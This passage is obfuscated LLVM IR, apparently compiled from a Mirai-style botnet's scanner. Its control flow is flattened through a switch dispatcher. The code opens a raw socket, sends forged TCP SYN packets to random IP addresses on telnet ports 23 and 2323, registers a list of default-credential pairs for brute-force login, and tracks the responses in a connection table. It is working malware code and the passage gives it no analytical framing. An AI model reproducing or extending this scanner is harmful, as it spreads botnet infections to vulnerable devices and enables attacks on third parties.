    i32 519101774, label %855
    i32 -64280984, label %860
    i32 -1783820832, label %875
    i32 1985249213, label %876
    i32 788020464, label %881
    i32 -1923219973, label %896
    i32 -1721006053, label %897
    i32 -773159092, label %902
    i32 366000576, label %917
    i32 -1160541541, label %918
    i32 1370989852, label %923
    i32 -1195941038, label %938
    i32 -177958160, label %939
    i32 1702295339, label %945
    i32 614937955, label %959
    i32 1238923468, label %964
    i32 -896950161, label %966
    i32 1386251401, label %967
    i32 -980697770, label %971
    i32 -818220828, label %989
    i32 684617584, label %990
    i32 -1782213126, label %NewDefault
    i32 412841872, label %991
    i32 -1242038026, label %992
    i32 -334086064, label %996
    i32 492267628, label %997
    i32 -468941522, label %1004
    i32 1401866364, label %1008
    i32 1955059999, label %1027
    i32 352134948, label %1028
    i32 -286917029, label %1029
    i32 -1925528720, label %1030
    i32 1191869318, label %1031
    i32 -1794290560, label %1034
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %48 = icmp sgt i32 %.reload, 0
  %49 = select i1 %48, i32 -2072661662, i32 30940931
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* @scanner_pid, align 4
  %52 = icmp eq i32 %51, -1
  %53 = select i1 %52, i32 -2072661662, i32 1722023776
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  ret void

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @util_local_addr()
  store i32 %56, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %57 = call i64 @time(i64* null) #6
  %58 = trunc i64 %57 to i32
  store i32 %58, i32* @fake_time, align 4
  %59 = call noalias i8* @calloc(i64 256, i64 296) #6
  %60 = bitcast i8* %59 to %struct.scanner_connection*
  store %struct.scanner_connection* %60, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  store i32 2103314733, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %1, align 4
  %63 = icmp slt i32 %62, 256
  %64 = select i1 %63, i32 1758045743, i32 -212656568
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %67 = load i32, i32* %1, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i64 %68
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 3
  store i32 0, i32* %70, align 8
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %72 = load i32, i32* %1, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i64 %73
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 1
  store i32 -1, i32* %75, align 8
  store i32 1699820075, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %1, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %1, align 4
  store i32 2103314733, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %80, i32* @rsck, align 4
  %81 = icmp eq i32 %80, -1
  %82 = select i1 %81, i32 1604295166, i32 -1505700051
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* @rsck, align 4
  %86 = load i32, i32* @rsck, align 4
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0)
  %88 = or i32 2048, %87
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 4, i32 %88)
  store i32 1, i32* %1, align 4
  %90 = load i32, i32* @rsck, align 4
  %91 = bitcast i32* %1 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp ne i32 %92, 0
  %94 = select i1 %93, i32 -798249934, i32 -1005714534
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* @rsck, align 4
  %97 = call i32 @close(i32 %96)
  call void @exit(i32 0) #8
  unreachable

; <label>:98:                                     ; preds = %loopEntry
  store i32 -1456204684, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32 @rand_next()
  %101 = and i32 %100, 65535
  %102 = trunc i32 %101 to i16
  store i16 %102, i16* %2, align 2
  store i32 669146838, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i16, i16* %2, align 2
  %105 = call zeroext i16 @ntohs(i16 zeroext %104) #7
  %106 = zext i16 %105 to i32
  %107 = icmp slt i32 %106, 1024
  %108 = select i1 %107, i32 -1456204684, i32 1053391369
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i64 1
  %112 = bitcast %struct.iphdr* %111 to %struct.tcphdr*
  store %struct.tcphdr* %112, %struct.tcphdr** %4, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, -16
  %117 = or i8 %116, 5
  store i8 %117, i8* %114, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = and i8 %120, 15
  %122 = or i8 %121, 64
  store i8 %122, i8* %119, align 4
  %123 = call zeroext i16 @htons(i16 zeroext 40) #7
  %124 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 2
  store i16 %123, i16* %125, align 2
  %126 = call i32 @rand_next()
  %127 = trunc i32 %126 to i16
  %128 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 3
  store i16 %127, i16* %129, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8 64, i8* %131, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 6
  store i8 6, i8* %133, align 1
  %134 = call zeroext i16 @htons(i16 zeroext 23) #7
  %135 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 1
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %2, align 2
  %138 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  store i16 %137, i16* %139, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -241
  %144 = or i16 %143, 80
  store i16 %144, i16* %141, align 4
  %145 = call i32 @rand_next()
  %146 = and i32 %145, 65535
  %147 = trunc i32 %146 to i16
  %148 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 5
  store i16 %147, i16* %149, align 2
  %150 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -513
  %154 = or i16 %153, 512
  store i16 %154, i16* %151, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  store i32 -2090255881, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %156 = load i32, i32* @fake_time, align 4
  %157 = load i32, i32* %10, align 4
  %158 = icmp ne i32 %156, %157
  %159 = select i1 %158, i32 -1777417245, i32 -625172192
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i32, i32* @fake_time, align 4
  store i32 %161, i32* %10, align 4
  store i32 0, i32* %1, align 4
  store i32 555753709, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %1, align 4
  %164 = icmp slt i32 %163, 384
  %165 = select i1 %164, i32 -1445666268, i32 851461472
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %167, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %168 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i64 1
  %170 = bitcast %struct.iphdr* %169 to %struct.tcphdr*
  store %struct.tcphdr* %170, %struct.tcphdr** %16, align 8
  %171 = call i32 @rand_next()
  %172 = trunc i32 %171 to i16
  %173 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = call i32 @get_random_ip()
  %179 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  store i32 %178, i32* %180, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 7
  store i16 0, i16* %182, align 2
  %183 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %184 = bitcast %struct.iphdr* %183 to i16*
  %185 = call zeroext i16 @checksum_generic(i16* %184, i32 20)
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 7
  store i16 %185, i16* %187, align 2
  %188 = load i32, i32* %1, align 4
  %189 = srem i32 %188, 10
  %190 = icmp eq i32 %189, 0
  %191 = select i1 %190, i32 -1112963492, i32 -1913368127
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  store i32 1064328857, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = call zeroext i16 @htons(i16 zeroext 23) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  store i32 1064328857, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 9
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 6
  store i16 0, i16* %207, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %209 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %210 = bitcast %struct.tcphdr* %209 to i8*
  %211 = call zeroext i16 @htons(i16 zeroext 20) #7
  %212 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %208, i8* %210, i16 zeroext %211, i32 20)
  %213 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 6
  store i16 %212, i16* %214, align 4
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %215, align 4
  %216 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 9
  %218 = load i32, i32* %217, align 4
  %219 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %220 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %219, i32 0, i32 0
  store i32 %218, i32* %220, align 4
  %221 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 1
  %223 = load i16, i16* %222, align 2
  %224 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %223, i16* %224, align 2
  %225 = load i32, i32* @rsck, align 4
  %226 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %227 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %227, %struct.sockaddr** %226, align 8
  %228 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %229 = load %struct.sockaddr*, %struct.sockaddr** %228, align 8
  %230 = call i64 @sendto(i32 %225, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %229, i32 16)
  store i32 642925505, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i32, i32* %1, align 4
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %1, align 4
  store i32 555753709, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  store i32 -625172192, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %238 = bitcast i8* %237 to %struct.iphdr*
  store %struct.iphdr* %238, %struct.iphdr** %20, align 8
  %239 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i64 1
  %241 = bitcast %struct.iphdr* %240 to %struct.tcphdr*
  store %struct.tcphdr* %241, %struct.tcphdr** %21, align 8
  %242 = call i32* @__errno_location() #7
  store i32 0, i32* %242, align 4
  %243 = load i32, i32* @rsck, align 4
  %244 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %245 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %245, align 8
  %246 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %247 = load %struct.sockaddr*, %struct.sockaddr** %246, align 8
  %248 = call i64 @recvfrom(i32 %243, i8* %244, i64 1514, i32 16384, %struct.sockaddr* %247, i32* null)
  %249 = trunc i64 %248 to i32
  store i32 %249, i32* %18, align 4
  %250 = load i32, i32* %18, align 4
  %251 = icmp sle i32 %250, 0
  %252 = select i1 %251, i32 -883098242, i32 681878925
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = call i32* @__errno_location() #7
  %255 = load i32, i32* %254, align 4
  %256 = icmp eq i32 %255, 11
  %257 = select i1 %256, i32 -883098242, i32 -1857649820
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i32* @__errno_location() #7
  %260 = load i32, i32* %259, align 4
  %261 = icmp eq i32 %260, 11
  %262 = select i1 %261, i32 -883098242, i32 -323432376
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  store i32 -883002138, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %18, align 4
  %266 = sext i32 %265 to i64
  %267 = icmp ult i64 %266, 40
  %268 = select i1 %267, i32 -405075291, i32 -981297518
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 9
  %273 = load i32, i32* %272, align 4
  %274 = load i32, i32* @LOCAL_ADDR, align 4
  %275 = icmp ne i32 %273, %274
  %276 = select i1 %275, i32 -1992820393, i32 2111147493
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 6
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp ne i32 %282, 6
  %284 = select i1 %283, i32 -1894981624, i32 1717081268
  store i32 %284, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 0
  %289 = load i16, i16* %288, align 4
  %290 = zext i16 %289 to i32
  %291 = call zeroext i16 @htons(i16 zeroext 23) #7
  %292 = zext i16 %291 to i32
  %293 = icmp ne i32 %290, %292
  %294 = select i1 %293, i32 -930276638, i32 -831658266
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = load i16, i16* %297, align 4
  %299 = zext i16 %298 to i32
  %300 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %301 = zext i16 %300 to i32
  %302 = icmp ne i32 %299, %301
  %303 = select i1 %302, i32 -1345697733, i32 -831658266
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 1
  %308 = load i16, i16* %307, align 2
  %309 = zext i16 %308 to i32
  %310 = load i16, i16* %2, align 2
  %311 = zext i16 %310 to i32
  %312 = icmp ne i32 %309, %311
  %313 = select i1 %312, i32 -2111352552, i32 148524329
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = lshr i16 %318, 9
  %320 = and i16 %319, 1
  %321 = icmp ne i16 %320, 0
  %322 = select i1 %321, i32 1833697542, i32 1401473643
  store i32 %322, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = lshr i16 %327, 12
  %329 = and i16 %328, 1
  %330 = icmp ne i16 %329, 0
  %331 = select i1 %330, i32 1096313591, i32 -1570294175
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i32 0, i32 4
  %336 = load i16, i16* %335, align 4
  %337 = lshr i16 %336, 10
  %338 = and i16 %337, 1
  %339 = icmp ne i16 %338, 0
  %340 = select i1 %339, i32 430789642, i32 -224190528
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 4
  %345 = load i16, i16* %344, align 4
  %346 = lshr i16 %345, 8
  %347 = and i16 %346, 1
  %348 = icmp ne i16 %347, 0
  %349 = select i1 %348, i32 -345724480, i32 994022824
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %353 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %352, i32 0, i32 3
  %354 = load i32, i32* %353, align 4
  %355 = call i32 @ntohl(i32 %354) #7
  %356 = sub i32 %355, 1
  %357 = call i32 @htonl(i32 %356) #7
  %358 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 8
  %360 = load i32, i32* %359, align 4
  %361 = icmp ne i32 %357, %360
  %362 = select i1 %361, i32 969558067, i32 -1765494742
  store i32 %362, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  store i32 623441401, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %365 = load i32, i32* %9, align 4
  store i32 %365, i32* %18, align 4
  store i32 -709897714, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i32, i32* %18, align 4
  %368 = icmp slt i32 %367, 256
  %369 = select i1 %368, i32 -462357896, i32 -723061757
  store i32 %369, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %371 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %372 = load i32, i32* %18, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %371, i64 %373
  %375 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %374, i32 0, i32 3
  %376 = load i32, i32* %375, align 8
  %377 = icmp eq i32 %376, 0
  %378 = select i1 %377, i32 167275075, i32 -523095188
  store i32 %378, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %381 = load i32, i32* %18, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %380, i64 %382
  store %struct.scanner_connection* %383, %struct.scanner_connection** %22, align 8
  %384 = load i32, i32* %18, align 4
  store i32 %384, i32* %9, align 4
  store i32 -723061757, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 -2045236567, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %18, align 4
  %388 = add nsw i32 %387, 1
  store i32 %388, i32* %18, align 4
  store i32 -709897714, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %391 = icmp eq %struct.scanner_connection* %390, null
  %392 = select i1 %391, i32 -1985285462, i32 1679664494
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  store i32 -883002138, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 8
  %397 = load i32, i32* %396, align 4
  %398 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %399 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %398, i32 0, i32 4
  store i32 %397, i32* %399, align 4
  %400 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
